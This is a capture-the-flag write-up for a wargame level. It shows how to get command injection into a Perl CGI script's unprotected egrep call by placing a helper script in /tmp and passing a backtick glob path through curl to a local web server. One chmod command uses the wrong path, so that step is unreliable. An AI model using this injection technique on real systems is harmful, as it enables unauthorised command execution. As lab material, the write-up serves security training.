# Level12

A perl script can be found in the directory with flag12 rights. This time we have an unprotected egrep on user input string. However, the input string goes through some manipulation.

```perl
$xx =~ tr/a-z/A-Z/;
# changes lowercase to uppercase

$xx =~ s/\s.*//;
# removes spaces
```

Therefore we cannot input the command directly through the string but we can inject the path to a script that will run getflag, as long as the path has no spaces or lowercase letters.

```bash
echo "getflag > /tmp/token" > /tmp/RUNME
chmod +x /TMP/RUNME
```

Similar to level04 this script uses CGI, and its defined webserver is `localhost:4646`
We can use curl to pass the path parameter that be assigned to `$xx`

```bash
curl http://localhost:4646?x=\`/*/RUNME\`
cat /tmp/token
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
